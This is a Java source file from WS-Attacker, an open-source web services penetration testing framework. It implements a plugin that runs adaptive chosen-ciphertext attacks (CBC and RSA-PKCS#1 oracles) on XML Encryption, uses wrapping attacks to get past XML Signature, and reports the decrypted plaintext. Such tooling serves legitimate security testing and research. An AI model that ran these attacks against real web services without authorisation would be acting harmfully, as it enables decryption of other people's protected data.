/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.xmlencryptionattack;

import wsattacker.library.xmlencryptionattack.attackengine.AttackManager;
import wsattacker.library.xmlencryptionattack.avoidingengine.AvoidingManager;
import com.eviware.soapui.impl.wsdl.WsdlRequest;
import java.io.File;
import java.io.UnsupportedEncodingException;
import java.util.List;
import javax.xml.xpath.XPathExpressionException;
import org.apache.log4j.Logger;
import org.w3c.dom.Document;
import wsattacker.library.schemaanalyzer.SchemaAnalyzer;
import wsattacker.library.schemaanalyzer.SchemaAnalyzerFactory;
import wsattacker.library.signatureWrapping.util.exception.InvalidPayloadException;
import wsattacker.library.signatureWrapping.util.exception.InvalidWeaknessException;
import wsattacker.library.xmlencryptionattack.attackengine.AttackConfig;
import wsattacker.library.xmlencryptionattack.attackengine.CryptoAttackException;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.AOracle;
import wsattacker.library.xmlencryptionattack.detectionengine.detectionmanager.DetectFilterEnum;
import wsattacker.library.xmlencryptionattack.detectionengine.detectionstreams.DetectionReport;
import wsattacker.library.xmlencryptionattack.detectionengine.filter.info.AbstractDetectionInfo;
import wsattacker.library.xmlencryptionattack.encryptedelements.AbstractEncryptionElement;
import wsattacker.library.xmlutilities.dom.DomUtilities;
import wsattacker.main.composition.plugin.AbstractPlugin;
import wsattacker.main.composition.testsuite.RequestResponsePair;
import wsattacker.main.plugin.PluginState;
import wsattacker.main.testsuite.TestSuite;
import org.xml.sax.SAXException;
import uk.ac.shef.wit.simmetrics.similaritymetrics.InterfaceStringMetric;
import wsattacker.library.xmlencryptionattack.attackengine.Utility;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.mode.AbstractOracleBehaviour;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.mode.error.OracleErrorBehaviour;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.concrete.cbc.CBCOracle;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.concrete.pkcs1.PKCS1Oracle;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.concrete.pkcs1.strategy.AbstractPKCS1Strategy;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.concrete.pkcs1.strategy.PKCS1StrategyFactory;
import wsattacker.library.xmlencryptionattack.detectionengine.detectionmanager.FactoryFilter;
import wsattacker.library.xmlencryptionattack.detectionengine.filter.concrete.AvoidedDocErrorFilter;
import wsattacker.library.xmlencryptionattack.detectionengine.filter.info.AvoidedDocErrorInfo;
import wsattacker.library.xmlencryptionattack.encryptedelements.ElementAttackProperties;
import wsattacker.library.xmlencryptionattack.encryptedelements.key.EncryptedKeyElement;
import wsattacker.library.xmlencryptionattack.util.HelperFunctions;
import static wsattacker.library.xmlencryptionattack.util.SimStringStrategyFactory.createSimStringStrategy;
import static wsattacker.library.xmlencryptionattack.util.XMLEncryptionConstants.NO_CURR_WRAP_IDX;
import static wsattacker.library.xmlencryptionattack.util.XMLEncryptionConstants.OracleMode.ERROR_ORACLE;
import static wsattacker.library.xmlencryptionattack.util.XMLEncryptionConstants.WrappingAttackMode.NO_WRAP;
import wsattacker.library.xmlencryptionattack.util.XMLEncryptionConstants.XMLEncryptionAttackMode;
import static wsattacker.library.xmlencryptionattack.util.XMLEncryptionConstants.XMLEncryptionAttackMode.PKCS1_ATTACK;
import static wsattacker.library.xmlutilities.dom.DomUtilities.domToString;
import wsattacker.plugin.xmlencryptionattack.option.OptionManagerEncryption;

public class XMLEncryptionAttack
    extends AbstractPlugin
{

    private static final Logger LOG = Logger.getLogger( XMLEncryptionAttack.class );

    private static final String NAME = "XML Encryption Attack";

    private static final String DESCRIPTION =
        "<html><p>Contains adaptive chosen ciphertext attacks on XML Encryption. "
            + "Currently supported techniques:</p><ul>" + "<li>Attack on CBC Ciphertexts.</li>"
            + "<li>Attack on RSA-PKCS#1 Ciphertexts using direct error messages.</li>"
            + "<li>Attack on RSA-PKCS#1 Ciphertexts using a CBC weakness.</li>"
            + "</ul><p>To overcome XML Signature protection, XML Signature and "
            + "XML Encryption Wrapping attacks are implemented.</p></html>";

    private static final String AUTHOR = "Dennis Kupser";

    private static final String VERSION = "1.0 / 2015-05-08";

    private static final String[] CATEGORY = new String[] { "Security", "Encryption" };

    private static SchemaAnalyzer m_SchemaAnalyser = null;

    private static SchemaAnalyzer m_UsedSchemaAnalyser = null;

    private AttackConfig m_AttackCfg = null;

    private AvoidedDocErrorFilter m_AvoiDocErrFilter = null;

    private OptionManagerEncryption m_OptionManager = null;

    private final int m_SuccessThreashold = 100;

    @Override
    public void initializePlugin()
    {
        setName( NAME );
        setDescription( DESCRIPTION );
        setAuthor( AUTHOR );
        setVersion( VERSION );
        setCategory( CATEGORY );
        this.m_SchemaAnalyser = SchemaAnalyzerFactory.getInstance( SchemaAnalyzerFactory.ALL );
        this.m_UsedSchemaAnalyser = m_SchemaAnalyser;
        this.m_OptionManager = OptionManagerEncryption.getInstance();
        this.m_OptionManager.setPlugin( this );
        TestSuite.getInstance().getCurrentRequest().addCurrentRequestContentObserver( m_OptionManager );
        this.m_AvoiDocErrFilter = (AvoidedDocErrorFilter) FactoryFilter.createFilter( DetectFilterEnum.AVOIDDOCFILTER );
    }

    @Override
    public void clean()
    {
        setCurrentPoints( 0 );
        checkState();
    }

    @Override
    public boolean wasSuccessful()
    {
        return isFinished() && getCurrentPoints() >= m_SuccessThreashold;
    }

    @Override
	protected void attackImplementationHook(RequestResponsePair original) {
		DetectionReport detectReport = m_OptionManager.getDetectReport();

		if (null == m_AttackCfg.getChosenAttackPayload()) {
			throw new IllegalArgumentException("user has to choose an attack payload");
		}

		if (null == detectReport.getDetectionInfo(DetectFilterEnum.AVOIDDOCFILTER)) {
			try {
				getAvoidedAttackRequest(detectReport);
			} catch (InvalidWeaknessException ex) {
				info("Avoided Attack Request Error:\n" + ex.toString());
			} catch (InvalidPayloadException ex) {
				info("Avoided Attack Request Error:\n" + ex.toString());
			} catch (SAXException ex) {
				info("Avoided Attack Request Error:\n" + ex.toString());
			} catch (XPathExpressionException ex) {
				info("Avoided Attack Request Error:\n" + ex.toString());
			}

		}

		if (null != detectReport.getDetectionInfo(DetectFilterEnum.AVOIDDOCFILTER)) {
			setCurrentPoints(50);
			try {
				handleEncryptionAttack(detectReport);
			} catch (IllegalArgumentException | UnsupportedEncodingException ex) {
				LOG.error(ex);
			}
		} else {
			info("XML Encryption attack is not possible");
		}

	}

    public void getAvoidedAttackRequest( DetectionReport detectReport )
        throws InvalidWeaknessException, InvalidPayloadException, SAXException, XPathExpressionException
    {
        // !!! important !! save payload element (wrapped element in wrapping attack document (avoidedFile))
        // important information for encryption attack:
        // 1. which is the payload element => for modifying ciphervalue
        // 2. the valid wrapping document (result of wrapping attacks)
        // => information saved in errorInfo-object of AVOIDDOCFILTER

        final WsdlRequest wsdlRequest = TestSuite.getInstance().getCurrentRequest().getWsdlRequest();
        WebServiceSendCommand serSendCmnd = new WebServiceSendCommand( wsdlRequest );

        if ( NO_WRAP != m_AttackCfg.getWrappingMode() )
        {
            setAvoidedDocWithAvoidingManager( detectReport, serSendCmnd );

        }
        else
        // no wrapping attacks for payload
        {
            setAvoidedDocWithoutWrapping( detectReport );
        }
    }

    private void setAvoidedDocWithAvoidingManager( DetectionReport detectReport, WebServiceSendCommand serSendCmnd )
        throws InvalidWeaknessException, InvalidPayloadException, XPathExpressionException, SAXException
    {
        info( "Starting Wrapping Attack" );
        AvoidingManager avoidManager = null;
        AvoidedDocErrorInfo avoidedDocInfo = null;

        try
        {
            // start to avoid possible countermeasures
            avoidManager = new AvoidingManager( m_AttackCfg.getChosenWrapPayload(), detectReport, m_SchemaAnalyser );
            avoidManager.setUseEncTypeWeakness( m_AttackCfg.isEncTypeWeakness() );
            avoidManager.setAttackPay( m_AttackCfg.getChosenAttackPayload() );
            avoidManager.setWrapErrCmpThreshold( m_AttackCfg.getStringCmpWrappErrThreshold() );
        }
        catch ( InvalidPayloadException ex )
        {
            info( "AvoidingManager Error:\n" + ex.toString() );
        }
        catch ( InvalidWeaknessException ex )
        {
            info( "AvoidingManager Error:\n" + ex.toString() );
        }

        avoidedDocInfo = avoidManager.getAvoidedDocument( m_AttackCfg.getWrappingMode(), serSendCmnd );

        detectReport.addDetectionInfo( DetectFilterEnum.AVOIDDOCFILTER, avoidedDocInfo );

        if ( null != avoidedDocInfo )
        {
            critical( "Wrapping position found" );
            info( "Avoided Document:\n" + domToString( avoidedDocInfo.getAvoidedDocument() ) );
        }
        else
        {
            important( "No wrapping position found" );
        }

        ElementAttackProperties wrapProp = m_AttackCfg.getChosenWrapPayload().getAttackProperties();
        if ( NO_CURR_WRAP_IDX == wrapProp.getCurrWrappingPayloadIdx() )
        {
            m_OptionManager.getOptionServerResponse().abortSendingMessages();
        }
    }

    private void setAvoidedDocWithoutWrapping( DetectionReport detectReport )
    {
        important( "Setting avoided Document" );
        AbstractDetectionInfo errorInfo = null;
        ( (AvoidedDocErrorFilter) m_AvoiDocErrFilter ).setPayloadInput( m_AttackCfg.getChosenAttackPayload() );
        AbstractEncryptionElement tempPayElement = ( (AvoidedDocErrorFilter) m_AvoiDocErrFilter ).getPayloadInput();
        ElementAttackProperties attackPropsPay = tempPayElement.getAttackProperties();
        ( (AvoidedDocErrorFilter) m_AvoiDocErrFilter ).setInputDocument( detectReport.getRawFile() );
        attackPropsPay.setAttackPayloadElement( ( (AvoidedDocErrorFilter) m_AvoiDocErrFilter ).getPayloadInput().getEncryptedElement() );
        errorInfo = ( (AvoidedDocErrorFilter) m_AvoiDocErrFilter ).process();

        if ( tempPayElement instanceof EncryptedKeyElement )
        {
            AvoidedDocErrorFilter tempErrorFilter = null;
            AbstractEncryptionElement tempPayEncData = null;
            ElementAttackProperties attackPropsPayEncData = null;
            AbstractDetectionInfo tempErrorInfo = null;
            tempErrorFilter = (AvoidedDocErrorFilter) FactoryFilter.createFilter( DetectFilterEnum.AVOIDDOCFILTER );
            tempPayEncData = HelperFunctions.getEncDataOfEncryptedKey( (EncryptedKeyElement) tempPayElement );

            attackPropsPayEncData = tempPayEncData.getAttackProperties();
            ( (AvoidedDocErrorFilter) tempErrorFilter ).setPayloadInput( tempPayEncData );
            ( (AvoidedDocErrorFilter) tempErrorFilter ).setInputDocument( detectReport.getRawFile() );
            attackPropsPayEncData.setAttackPayloadElement( ( (AvoidedDocErrorFilter) tempErrorFilter ).getPayloadInput().getEncryptedElement() );
            tempErrorInfo = ( (AvoidedDocErrorFilter) tempErrorFilter ).process();
        }
        detectReport.addDetectionInfo( DetectFilterEnum.AVOIDDOCFILTER, errorInfo );
    }

    private void handleEncryptionAttack( DetectionReport detectReport )
        throws IllegalArgumentException, UnsupportedEncodingException
    {
        AOracle oracle = null;

        final WsdlRequest wsdlRequest = TestSuite.getInstance().getCurrentRequest().getWsdlRequest();
        WebServiceSendCommand serSendCmnd = new WebServiceSendCommand( wsdlRequest );
        oracle = initAttackOracle( detectReport, serSendCmnd );
        executeAttack( detectReport, oracle );
    }

    private AOracle initAttackOracle( DetectionReport detectReport, WebServiceSendCommand serSendCmnd )
        throws IllegalArgumentException
    {
        AOracle oracle = null;
        AbstractOracleBehaviour oracleMode = null;

        if ( ERROR_ORACLE == m_AttackCfg.getOracleMode() )
        {
            InterfaceStringMetric simStrategy = createSimStringStrategy( m_AttackCfg.getSimStringStrategyType() );
            oracleMode = new OracleErrorBehaviour( detectReport.getErrorResponseTab(), simStrategy );
        }
        else
        {
            throw new IllegalArgumentException( "no valid oracle mode" );
        }

        if ( XMLEncryptionAttackMode.CBC_ATTACK == m_AttackCfg.getXMLEncryptionAttack() )
        {
            oracle = new CBCOracle( detectReport, oracleMode, serSendCmnd );
        }
        else if ( XMLEncryptionAttackMode.PKCS1_ATTACK == m_AttackCfg.getXMLEncryptionAttack() )
        {
            AbstractPKCS1Strategy pkcs1Strategy = null;
            oracle = new PKCS1Oracle( detectReport, oracleMode, serSendCmnd, m_AttackCfg.getPKCS1AttackCfg() );
            pkcs1Strategy =
                PKCS1StrategyFactory.createPKCS1Strategy( m_AttackCfg.getPKCS1AttackCfg().getPKCS1Strategy(),
                                                          (PKCS1Oracle) oracle );
            ( (PKCS1Oracle) oracle ).setPKCS1Strategy( pkcs1Strategy );
        }
        else
        {
            throw new IllegalArgumentException( "no valid attack oracle" );
        }

        return oracle;
    }

    private void executeAttack( DetectionReport detectReport, AOracle oracle )
        throws UnsupportedEncodingException
    {
        AttackManager attackManager = null;
        byte[] plainText = null;
        String resultString = null;

        try
        {
            // init attackmanager who executes the configured attack parameters
            attackManager = new AttackManager( detectReport, m_AttackCfg, oracle );

            info( "Starting " + m_AttackCfg.getXMLEncryptionAttack() );
            plainText = attackManager.executeAttack();

            if ( m_AttackCfg.getXMLEncryptionAttack().equals( PKCS1_ATTACK ) )
            {
                resultString = Utility.bytesToHex( plainText );
            }
            else
            {
                resultString = new String( plainText, "UTF-8" );
            }
            setCurrentPoints( 100 );
            critical( ( "Plaintext of encrypted data: " + resultString + "\nNumber of Oracle Queries: " + attackManager.getOracleofCCAAttacker().getNumberOfQueries() ) );
            info( "Bytes decrypted: " + plainText.length );
        }
        catch ( CryptoAttackException ex )
        {
            LOG.error( ex );
            info( "Error: Attack has not successfully executed:\n" + ex.toString() );
            setCurrentPoints( 0 );
        }
        catch ( Exception ex )
        {
            LOG.error( ex );
            info( "Error: Attack has not successfully executed:\n" + ex.toString() );
            setCurrentPoints( 0 );
        }
    }

    public void setUsedSchemaFiles( List<File> fileList )
    {
        log().info( "Cleared all Schemas" );
        m_SchemaAnalyser = SchemaAnalyzerFactory.getInstance( SchemaAnalyzerFactory.EMPTY );
        for ( File f : fileList )
        {
            try
            {
                Document schema = DomUtilities.readDocument( f );
                log().info( "Adding Schema " + f.getName() );
                m_SchemaAnalyser.appendSchema( schema );
            }
            catch ( Exception e )
            {
                log().warn( "Could not read Schema file '" + f.getName() + "'" );
            }
        }
    }

    public void checkState()
    {
        // Change does not have payload -> Check if we have still *any* payload
        log().debug( "### CHECK_STATE" );
        if ( null == m_AttackCfg )
        {
            log().debug( "### List Empty -> Not_Configured" );
            // No possible payloads found -> Request does not have an encrypted element
            setState( PluginState.Not_Configured );
        }
        else
        {
            AbstractEncryptionElement attackPay = m_AttackCfg.getChosenAttackPayload();
            if ( null != attackPay && null != m_OptionManager.getDetectReport().getErrorResponseTab() )
            {
                if ( !m_OptionManager.getDetectReport().getErrorResponseTab().getData().isEmpty() )
                {
                    setState( PluginState.Ready );
                }
                else
                {
                    setState( PluginState.Not_Configured );
                }
            }
            else
            {
                setState( PluginState.Not_Configured );
            }
        }
    }

    /**
     * If the plugin is stopped by user interaction, the attack request must be removed.
     */
    @Override
    public void stopHook()
    {
    }

    public void setSchemaAnalyzerDepdingOnOption()
    {
        if ( m_OptionManager.getOptionNoSchema().isOn() )
        {
            m_UsedSchemaAnalyser = SchemaAnalyzerFactory.getInstance( SchemaAnalyzerFactory.NULL );
        }
        else
        {
            m_UsedSchemaAnalyser = m_SchemaAnalyser;
        }
    }

    public AttackConfig getAttackCfg()
    {
        return m_AttackCfg;
    }

    public void setAttackCfg( AttackConfig attackCfg )
    {
        this.m_AttackCfg = attackCfg;
    }

}
